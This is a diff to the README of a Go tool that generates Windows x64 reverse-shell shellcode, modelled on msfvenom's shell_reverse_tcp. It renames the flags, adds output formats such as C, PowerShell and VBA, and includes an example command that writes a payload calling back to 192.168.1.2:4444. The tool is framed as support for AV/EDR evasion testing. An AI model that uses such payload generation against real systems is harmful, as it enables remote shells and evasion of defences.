@@ -6,18 +6,18 @@ msfvenom windows/x64/shell_reverse_tcp payload generator without dependencies
 ```
 $ ./shell_reverse_tcp -h
 Usage of ./shell_reverse_tcp:
-  -format string
-        Format: {raw, hex, base64} (default "raw")
-  -host string
-        Host IP address (default "127.0.0.1")
-  -port int
+  -f string
+        Formats: {raw, hex, base64, c, rust, csharp, psh, vba} (default "raw")
+  -l string
+        LHOST IP address (default "127.0.0.1")
+  -p int
         Port number (0-65535) (default 4444)
 ```
 
 ## Example
 
 ```
-$ ./shell_reverse_tcp -host 192.168.1.2 -port 4444 -format raw > shellcode.bin
+$ ./shell_reverse_tcp -l 192.168.1.2 -p 4444 -f raw > shellcode.bin
 ```
 
 # Build
@@ -30,9 +30,6 @@ go build .
 
 # Project spirit
 Generate your payload in x64 quickly and easily without dependencies to perform AV/EDR evasion tests on Windows in amd64, so you can use encoders, ciphers, obfuscators, whatever.
-
-# ToDo
-* add language support, example: `-lang c`
 
 # References
 * https://vay3t.medium.com/malware-development-generando-shellcodes-de-metasploit-sin-metasploit-aa120ffcdd92
